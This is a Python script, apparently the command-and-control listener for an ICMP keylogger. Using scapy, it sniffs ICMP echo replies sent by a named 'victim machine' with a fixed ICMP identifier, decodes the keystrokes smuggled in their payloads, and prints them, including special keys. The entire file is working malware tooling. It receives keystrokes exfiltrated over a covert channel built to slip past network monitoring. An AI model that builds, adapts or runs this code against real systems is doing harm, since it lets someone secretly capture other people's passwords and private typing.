#!/usr/bin/env python3
from scapy.all import sniff, IP, ICMP, Raw
import argparse

# Variables
ICMP_ID = int(13170)

# Argument Parser
parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g., eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Victim Machine IP Address")
args = parser.parse_args()

def format_key_data(key_data):
    # Dictionary of special keys for more readable output
    special_keys = {
        'space': ' ',
        'enter': '\n',
        'tab': '\t',
        'backspace': '[BACKSPACE]',
        'shift': '[SHIFT]',
        'ctrl': '[CTRL]',
        'alt': '[ALT]',
        'esc': '[ESC]',
        'delete': '[DEL]',
        # Add more keys as needed
    }

    if key_data.startswith('{') and key_data.endswith('}'):
        key_name = key_data[1:-1]
        return special_keys.get(key_name, f'[{key_name.upper()}]')
    return key_data

def shell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and Raw in pkt:
        key_data = pkt[Raw].load.decode('utf-8', errors='ignore')
        formatted_key_data = format_key_data(key_data)
        print(formatted_key_data, end='', flush=True)

def main():
    print("[+] ICMP Keylogger C2 started!")
    sniff(iface=args.interface, prn=shell, filter="icmp", store=False)

if __name__ == "__main__":
    main()
